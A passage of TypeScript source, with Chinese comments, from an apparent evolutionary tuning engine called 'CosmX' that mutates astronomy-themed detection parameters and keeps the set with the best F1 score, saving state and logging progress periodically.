    else tn++;
  }
  
  const precision = tp / Math.max(tp + fp, 1);
  const recall = tp / Math.max(tp + fn, 1);
  const f1 = 2 * precision * recall / Math.max(precision + recall, 1e-9);
  
  return { f1, precision, recall };
}

// 变异参数
function mutateParams(params: CosmXParams, round: number, rng: Rng): CosmXParams {
  const newParams = { ...params };
      const mutationRate = 0.1 + 0.05 * Math.sin(round / 100);
  
  const paramKeys: (keyof CosmXParams)[] = [
    'semiMajorAxisWeight', 'eccentricityWeight', 'inclinationWeight',
    'gravityConstant', 'perturbationScale',
    'zscoreThreshold', 'mahalanobisThreshold',
    'transferTimeWeight', 'transferAngleWeight',
    'forceThreshold', 'convergenceRadius',
    'anomalyWeight', 'perturbationWeight', 'gravityWeight',
  ];
  const numMutations = rngInt(rng, 3) + 1;
  
  for (let i = 0; i < numMutations; i++) {
    const key = paramKeys[rngInt(rng, paramKeys.length)];
    const currentValue = params[key];
    
    const delta = (rng() - 0.5) * mutationRate * currentValue * 2;
    newParams[key] = Math.max(0.01, currentValue + delta);
  }
  
  return newParams;
}

// 主进化循环
export function runEvolution(): void {
  console.log('🌌 宇宙星系法 (CosmX) 进化引擎启动');
  console.log(`📊 目标迭代: ${MAX_ROUNDS} 轮`);
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
  
  let state = loadState();
  let lastReport = 0;
  const startTime = Date.now();
  const rng = createRng(42);
  
  for (let round = state.round + 1; round <= MAX_ROUNDS; round++) {
    const newParams = mutateParams(state.best_params, round, rng);
    
    // 评估
    const metrics = evaluateParams(newParams);
    
    // 更新状态
    const record: EvolutionRecord = {
      round,
      params: newParams,
      f1: metrics.f1,
      precision: metrics.precision,
      recall: metrics.recall,
      delta: metrics.f1 - state.bestF1,
    };
    
    state.mutations.push(record);
    if (state.mutations.length > 1000) {
      state.mutations = state.mutations.slice(-1000);
    }
    
    if (metrics.f1 > state.bestF1) {
      state.bestF1 = metrics.f1;
      state.bestPrecision = metrics.precision;
      state.bestRecall = metrics.recall;
      state.best_params = newParams;
      state.last_update = new Date().toISOString();
      state.lastImprovement = round;
      state.mutationsApplied++;
      
      // 每100轮报告一次
      if (round - lastReport >= 100) {
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
        console.log(`✅ Round ${round} | F1: ${metrics.f1.toFixed(4)} | P: ${metrics.precision.toFixed(4)} | R: ${metrics.recall.toFixed(4)} | ⏱ ${elapsed}s`);
        lastReport = round;
      }
    }
    
    state.round = round;
    
    // 每500轮保存一次
    if (round % 500 === 0) {
      saveState(state);
    }
    
    // 每1000轮详细报告
    if (round % 1000 === 0) {
      const elapsedSec = (Date.now() - startTime) / 1000;
      const elapsed = elapsedSec.toFixed(1);
      const rate = (round / elapsedSec).toFixed(1);
      console.log(`\n📈 Round ${round}/${MAX_ROUNDS} | Best F1: ${state.bestF1.toFixed(4)} | Rate: ${rate} r/s | ⏱ ${elapsed}s`);
      console.log(`   Best params: semiMajorAxis=${state.best_params.semiMajorAxisWeight.toFixed(3)}, eccentricity=${state.best_params.eccentricityWeight.toFixed(3)}, zscore=${state.best_params.zscoreThreshold.toFixed(3)}`);
      console.log('');
    }
  }
  
  // 最终保存
  saveState(state);
  
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log(`✅ 进化完成! 总用时: ${totalTime}s`);
  console.log(`📊 最佳结果: F1=${state.bestF1.toFixed(4)}, P=${state.bestPrecision.toFixed(4)}, R=${state.bestRecall.toFixed(4)}`);
  console.log(`🔧 最佳参数已保存至 ${STATE_PATH}`);
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
}

if (import.meta.main) {
  runEvolution();
}